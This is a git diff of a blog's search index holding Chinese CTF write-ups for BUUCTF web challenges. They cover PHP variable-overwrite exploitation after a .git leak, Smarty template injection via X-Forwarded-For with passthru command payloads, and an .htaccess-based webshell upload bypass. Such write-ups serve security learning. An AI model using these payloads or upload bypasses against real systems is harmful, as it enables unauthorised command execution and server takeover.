@@ -1,6 +1,51 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>BJDCTF2020 Mark loves cat</title>
+    <url>/2022/03/30/BJDCTF2020%20Mark%20loves%20cat/</url>
+    <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境就发现这应该是一个网站模板，查看了源码以及数据包，发现都没有任何信息。在网页最下方有一个留言，随便输入之后发送发现 url 产生了变化。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.html?message=1</span><br></pre></td></tr></table></figure></p>
+<p>故测试是否存在注入的可能，后来发现并没有。走投无路的情况下就进行目录扫描，发现存在 <code>.git</code> 泄露。（我用 <code>dirsearch</code> 扫不出来，不知道为什么。）</p>
+<h1 id="解题">解题</h1>
+<p>将源码下载后查看了发现了两个 php 文件。</p>
+<p>index.php（重要部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>; </span><br></pre></td></tr></table></figure></p>
+<p>flag.php <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>); </span><br></pre></td></tr></table></figure></p>
+<p>接下来进行代码审计。</p>
+<blockquote>
+<p>这里先说明一个知识点<code>$_GET as $x =&gt; $y</code>，假设get方式传入 flag=abc，那么这句代码的意思是 <code>$x=flag, $y=abc</code>。</p>
+</blockquote>
+<p>再看完 flag.php 之后再看 index.php，一开始的思路就是绕过前面的 if，然后执行最后的 <code>echo "the flag is: ".$flag;</code> 即可获得 flag。</p>
+<p>需要get传入参数才能触发第一个if，要满足第一个if的话，需要至少传入两个参数 <code>p1=str&amp;flag=p1</code>（这里p1和str任意，p1不能为flag），因此绕过也很简单。查看第二个if，只需要传入flag参数即可，无论什么方式。接下来查看第三个if，只要参数flag的值不为flag即可。</p>
+<p>这么一看，绕过彷佛很简单，只需要get或者post传入<code>flag=abc</code>即可。但是注意到最前面的两个<code>foreach</code>，这才是本题的考点。假设我们<code>flag=abc</code>以get方式传入，那么经过第二个<code>foreach</code>： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$x</span>=flag, <span class="variable">$y</span>=abc</span><br><span class="line"><span class="number">2</span>. <span class="variable">$$x</span>=<span class="variable">$flag</span>, <span class="variable">$$y</span>=<span class="variable">$abc</span></span><br><span class="line"><span class="number">3</span>. 因为<span class="variable">$abc</span>并不存在，所以为空，即<span class="variable">$flag</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="number">4</span>. 这样即使绕过了，输入的flag也为空</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330205641.png" /></p>
+<p>post方式也是一样，会被第一个<code>foreach</code>修改flag值。</p>
+<p>因此，绕过这个方法行不通。此时注意到有三个地方有 <code>exit</code> 该函数虽然会退出程序，但是在退出之前也会将变量打印出来。因此，接下来的思路有三个：</p>
+<ol type="1">
+<li>`<span class="math inline">\(handsome=\)</span>flag``</li>
+<li><code>$yds=$flag</code></li>
+<li>`<code>$is=$flag</code></li>
+</ol>
+<p>看思路1，我们需要get方式传入 <code>handsome=flag&amp;flag=handsome</code>，<strong>注意顺序</strong>。此时的执行过程如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$handsome</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$handsome</span>为flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$handsome</span> -&gt; <span class="variable">$flag</span>获取<span class="variable">$handsome</span>的值，也就是flag</span><br><span class="line"><span class="number">3</span>. 输出 <span class="variable">$handsome</span>，也就是flag</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211022.png" /></p>
+<p>看思路2，这个是最简单的，只需要get方式传入 <code>yds=flag</code>，此时： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$yds</span>=<span class="variable">$flag</span></span><br><span class="line">然后输出 <span class="variable">$yds</span>，即flag</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211048.png" /></p>
+<p>看思路3之前，我们得先明白，参数只能通过第二个<code>foreach</code>才行，也就是必须用get方式传入<code>is=flag</code>，如果是post传入则会变成<code>$is=flag</code>那么输出就真的是“flag”了（笑）。接下来需要满足第三个if才能输出，也就是还需要传入一个参数flag，且值为flag。如果用post传入，则经过第一个 <code>foreach</code>，就会变成 <code>$flag=flag</code>，此时后面即使 <code>$is=$flag</code>，输出的也是“flag”。因此只能通过get传入，因此最终的payload为 <code>is=flag&amp;flag=flag</code>，这里顺序无所谓。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$is</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$is</span>获得flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$flag</span> -&gt; 什么都没改变</span><br><span class="line"><span class="number">3</span>. 输出<span class="variable">$is</span>，即flag</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211638.png" /></p>
+<h1 id="总结">总结</h1>
+<p>本题考察的是 <strong>php变量覆盖漏洞</strong>。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>=<span class="string">&#x27; world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$hello</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">此时的结果为：hello world</span><br><span class="line">解释：因为 <span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>，所以 <span class="variable">$$a</span>=<span class="variable">$hello</span>=<span class="string">&#x27; world&#x27;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330212116.png" /></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>git泄露</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BJDCTF20 Cookie is so stable</title>
     <url>/2022/04/05/BJDCTF20%20Cookie%20is%20so%20stable/</url>
     <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
@@ -52,82 +97,6 @@
       </tags>
   </entry>
   <entry>
-    <title>BJDCTF2020 The mystery of ip</title>
-    <url>/2022/03/22/BJDCTF2020%20The%20mystery%20of%20ip/</url>
-    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境后发现什么都没有，查看源码也没有。点击 <code>flag</code> 和 <code>hint</code> 都没有。抓包也没找到有用信息，因此想到扫描目录吧。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322201937.png" /></p>
-<p>发现有 <code>.DS_Store</code>，因此可能有信息泄露，但是下载下来发现，一堆乱码。此时注意到题目：<code>The_mystery_of_ip</code>，并且 <code>hint.php</code> 源码中提示到 <code>&lt;!-- Do you know why i know your ip? --&gt;</code>，忽然想到 <code>XFF</code>。</p>
-<h1 id="解题">解题</h1>
-<p>进入 <code>flag.php</code> 然后抓包，修改 <code>XFF</code>。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322202806.png" /></p>
-<p>说明此题的突破点就在这里，但是实在想不到，看了别人的 writeup 才知道这里考的是模板注入。</p>
-<p>先尝试 <code>&#123;&#123;2*3&#125;&#125;</code>，结果如下 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204148.png" /></p>
-<p>发现确实如此，输入 <code>&#123;&#123;php&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204358.png" /></p>
-<p>发现是 <code>smarty</code>。</p>
-<p><code>smarty</code> 存在命令执行： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec — 执行一个外部程序  </span><br><span class="line">passthru — 执行外部程序并且显示原始输出  </span><br><span class="line">proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码  </span><br><span class="line">proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。  </span><br><span class="line">popen — 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。  </span><br><span class="line">proc_terminate — 杀除由 proc_open 打开的进程  </span><br><span class="line">shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。  </span><br><span class="line">system — 执行外部程序，并且显示输出  </span><br><span class="line">scandir 列出指定路径中的文件和目录  </span><br><span class="line"><span class="keyword">eval</span> — 把字符串作为PHP代码执行  </span><br><span class="line">assert --函数直接将传入的参数当成PHP代码执行</span><br></pre></td></tr></table></figure></p>
-<p>输入 payload：<code>&#123;&#123;passthru("ls /")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204751.png" /></p>
-<p>发现 flag，利用 <code>&#123;&#123;passthru("cat /flag")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204858.png" /></p>
-<p>成功get。</p>
-<h1 id="总结">总结</h1>
-<ul>
-<li>模板注入是 CTF 中常考的题目，这里着实没想到。</li>
-<li>要注意题目环境中的各种信息，比如这题中的题目想到 <code>XFF</code>。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>SSTI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BJDCTF2020 Mark loves cat</title>
-    <url>/2022/03/30/BJDCTF2020%20Mark%20loves%20cat/</url>
-    <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境就发现这应该是一个网站模板，查看了源码以及数据包，发现都没有任何信息。在网页最下方有一个留言，随便输入之后发送发现 url 产生了变化。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.html?message=1</span><br></pre></td></tr></table></figure></p>
-<p>故测试是否存在注入的可能，后来发现并没有。走投无路的情况下就进行目录扫描，发现存在 <code>.git</code> 泄露。（我用 <code>dirsearch</code> 扫不出来，不知道为什么。）</p>
-<h1 id="解题">解题</h1>
-<p>将源码下载后查看了发现了两个 php 文件。</p>
-<p>index.php（重要部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>; </span><br></pre></td></tr></table></figure></p>
-<p>flag.php <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>); </span><br></pre></td></tr></table></figure></p>
-<p>接下来进行代码审计。</p>
-<blockquote>
-<p>这里先说明一个知识点<code>$_GET as $x =&gt; $y</code>，假设get方式传入 flag=abc，那么这句代码的意思是 <code>$x=flag, $y=abc</code>。</p>
-</blockquote>
-<p>再看完 flag.php 之后再看 index.php，一开始的思路就是绕过前面的 if，然后执行最后的 <code>echo "the flag is: ".$flag;</code> 即可获得 flag。</p>
-<p>需要get传入参数才能触发第一个if，要满足第一个if的话，需要至少传入两个参数 <code>p1=str&amp;flag=p1</code>（这里p1和str任意，p1不能为flag），因此绕过也很简单。查看第二个if，只需要传入flag参数即可，无论什么方式。接下来查看第三个if，只要参数flag的值不为flag即可。</p>
-<p>这么一看，绕过彷佛很简单，只需要get或者post传入<code>flag=abc</code>即可。但是注意到最前面的两个<code>foreach</code>，这才是本题的考点。假设我们<code>flag=abc</code>以get方式传入，那么经过第二个<code>foreach</code>： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$x</span>=flag, <span class="variable">$y</span>=abc</span><br><span class="line"><span class="number">2</span>. <span class="variable">$$x</span>=<span class="variable">$flag</span>, <span class="variable">$$y</span>=<span class="variable">$abc</span></span><br><span class="line"><span class="number">3</span>. 因为<span class="variable">$abc</span>并不存在，所以为空，即<span class="variable">$flag</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="number">4</span>. 这样即使绕过了，输入的flag也为空</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330205641.png" /></p>
-<p>post方式也是一样，会被第一个<code>foreach</code>修改flag值。</p>
-<p>因此，绕过这个方法行不通。此时注意到有三个地方有 <code>exit</code> 该函数虽然会退出程序，但是在退出之前也会将变量打印出来。因此，接下来的思路有三个：</p>
-<ol type="1">
-<li>`<span class="math inline">\(handsome=\)</span>flag``</li>
-<li><code>$yds=$flag</code></li>
-<li>`<code>$is=$flag</code></li>
-</ol>
-<p>看思路1，我们需要get方式传入 <code>handsome=flag&amp;flag=handsome</code>，<strong>注意顺序</strong>。此时的执行过程如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$handsome</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$handsome</span>为flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$handsome</span> -&gt; <span class="variable">$flag</span>获取<span class="variable">$handsome</span>的值，也就是flag</span><br><span class="line"><span class="number">3</span>. 输出 <span class="variable">$handsome</span>，也就是flag</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211022.png" /></p>
-<p>看思路2，这个是最简单的，只需要get方式传入 <code>yds=flag</code>，此时： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$yds</span>=<span class="variable">$flag</span></span><br><span class="line">然后输出 <span class="variable">$yds</span>，即flag</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211048.png" /></p>
-<p>看思路3之前，我们得先明白，参数只能通过第二个<code>foreach</code>才行，也就是必须用get方式传入<code>is=flag</code>，如果是post传入则会变成<code>$is=flag</code>那么输出就真的是“flag”了（笑）。接下来需要满足第三个if才能输出，也就是还需要传入一个参数flag，且值为flag。如果用post传入，则经过第一个 <code>foreach</code>，就会变成 <code>$flag=flag</code>，此时后面即使 <code>$is=$flag</code>，输出的也是“flag”。因此只能通过get传入，因此最终的payload为 <code>is=flag&amp;flag=flag</code>，这里顺序无所谓。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$is</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$is</span>获得flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$flag</span> -&gt; 什么都没改变</span><br><span class="line"><span class="number">3</span>. 输出<span class="variable">$is</span>，即flag</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211638.png" /></p>
-<h1 id="总结">总结</h1>
-<p>本题考察的是 <strong>php变量覆盖漏洞</strong>。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>=<span class="string">&#x27; world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$hello</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">此时的结果为：hello world</span><br><span class="line">解释：因为 <span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>，所以 <span class="variable">$$a</span>=<span class="variable">$hello</span>=<span class="string">&#x27; world&#x27;</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330212116.png" /></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>git泄露</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BSidesCF 2020 Had a bad day</title>
     <url>/2022/03/29/BSidesCF%202020%20Had%20a%20bad%20day/</url>
     <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
@@ -171,41 +140,34 @@
       </tags>
   </entry>
   <entry>
-    <title>GXYCTF2019 BabyUpload</title>
-    <url>/2022/03/21/GXYCTF2019%20BabyUpload/</url>
+    <title>BJDCTF2020 The mystery of ip</title>
+    <url>/2022/03/22/BJDCTF2020%20The%20mystery%20of%20ip/</url>
     <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
 <span id="more"></span>
 <h1 id="题目信息">题目信息</h1>
-<p>打开环境可以很明显看到，这就是一个文件上传的题目。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321194818.png" /></p>
-<h1 id="过滤测试">过滤测试</h1>
-<h2 id="过滤类型测试">过滤类型测试</h2>
-<p>随便上传一个图片 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195148.png" /></p>
-<p>根据提示 <code>上传类型</code> 推测应该需要修改 <code>Content-Type</code>，尝试 <code>image/gif</code> 和 <code>imag/jpeg</code> 后，发现后者是可以的。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195315.png" /></p>
-<h2 id="过滤后缀测试">过滤后缀测试</h2>
-<p>将后缀修改为 <code>php</code> ，上传 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195444.png" /></p>
-<p>经过多次尝试，发现我无法绕过这个过滤。此时思考，是否可以不用特定后缀又可以上传文件，想到了 <code>.htaccess</code> 。尝试一下发现成功！ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195835.png" /></p>
-<p>记录一下地址 <code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/.htaccess</code>。之后，只要上传一个文件名为 <code>shell.jpg</code> 的木马即可。</p>
-<h2 id="文件内容过滤">文件内容过滤</h2>
-<p>写入一句话木马，然后上传，果不其然被过滤了。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200100.png" /></p>
-<p>换一种写法发现还是不行 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200308.png" /></p>
-<p>猜测过滤的应该是开头的那个 <code>php</code> 。因此，换一种写法，成功绕过。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200502.png" /></p>
-<p>记录上传地址：<code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/shell.jpg</code></p>
-<h1 id="蚁剑连接get-flag">蚁剑连接get flag</h1>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200538.png" /></p>
-<p>flag在根目录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200555.png" /></p>
-<p>成功。</p>
+<p>进入环境后发现什么都没有，查看源码也没有。点击 <code>flag</code> 和 <code>hint</code> 都没有。抓包也没找到有用信息，因此想到扫描目录吧。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322201937.png" /></p>
+<p>发现有 <code>.DS_Store</code>，因此可能有信息泄露，但是下载下来发现，一堆乱码。此时注意到题目：<code>The_mystery_of_ip</code>，并且 <code>hint.php</code> 源码中提示到 <code>&lt;!-- Do you know why i know your ip? --&gt;</code>，忽然想到 <code>XFF</code>。</p>
+<h1 id="解题">解题</h1>
+<p>进入 <code>flag.php</code> 然后抓包，修改 <code>XFF</code>。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322202806.png" /></p>
+<p>说明此题的突破点就在这里，但是实在想不到，看了别人的 writeup 才知道这里考的是模板注入。</p>
+<p>先尝试 <code>&#123;&#123;2*3&#125;&#125;</code>，结果如下 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204148.png" /></p>
+<p>发现确实如此，输入 <code>&#123;&#123;php&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204358.png" /></p>
+<p>发现是 <code>smarty</code>。</p>
+<p><code>smarty</code> 存在命令执行： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec — 执行一个外部程序  </span><br><span class="line">passthru — 执行外部程序并且显示原始输出  </span><br><span class="line">proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码  </span><br><span class="line">proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。  </span><br><span class="line">popen — 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。  </span><br><span class="line">proc_terminate — 杀除由 proc_open 打开的进程  </span><br><span class="line">shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。  </span><br><span class="line">system — 执行外部程序，并且显示输出  </span><br><span class="line">scandir 列出指定路径中的文件和目录  </span><br><span class="line"><span class="keyword">eval</span> — 把字符串作为PHP代码执行  </span><br><span class="line">assert --函数直接将传入的参数当成PHP代码执行</span><br></pre></td></tr></table></figure></p>
+<p>输入 payload：<code>&#123;&#123;passthru("ls /")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204751.png" /></p>
+<p>发现 flag，利用 <code>&#123;&#123;passthru("cat /flag")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204858.png" /></p>
+<p>成功get。</p>
 <h1 id="总结">总结</h1>
-<ol type="1">
-<li>要熟悉常用的上传类型，题目中大多考察的是图片，因此要熟记：<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>；</li>
-<li>当脚本后缀被过滤之后，并且无法绕过时，需要想到 <code>.htaccess</code>；</li>
-<li>文件内容的过滤，需要知道多种木马的写法。</li>
-</ol>
+<ul>
+<li>模板注入是 CTF 中常考的题目，这里着实没想到。</li>
+<li>要注意题目环境中的各种信息，比如这题中的题目想到 <code>XFF</code>。</li>
+</ul>
 ]]></content>
       <categories>
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>文件上传</tag>
+        <tag>SSTI</tag>
       </tags>
   </entry>
   <entry>
@@ -394,45 +356,41 @@
       </tags>
   </entry>
   <entry>
-    <title>GWCTF 2019 我有一个数据库</title>
-    <url>/2022/03/24/GWCTF%202019%20%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
+    <title>GXYCTF2019 BabyUpload</title>
+    <url>/2022/03/21/GXYCTF2019%20BabyUpload/</url>
     <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
 <span id="more"></span>
 <h1 id="题目信息">题目信息</h1>
-<p>进入环境之后，不论是数据包还是页面源码，什么信息都没有，只有如下看不懂的字</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204732.png" /></p>
-<p>因此，决定扫描目录，结果如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204816.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204824.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204843.png" /></p>
-<p>将所有都访问一次，发现只有 <code>/phpmyadmin</code> 有用，界面如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204938.png" /></p>
-<h1 id="解题">解题</h1>
-<p>通过该页面发现：</p>
-<ol type="1">
-<li><p>phpmyadmin 版本为 4.8.1</p></li>
-<li><p>服务器用的是 apache</p></li>
-<li><p>数据库是 mysql</p></li>
-<li><p>PHP版本信息为 7.2.24-0ubuntu0.18.04.1</p></li>
-<li><p>系统为 Ubuntu</p></li>
-</ol>
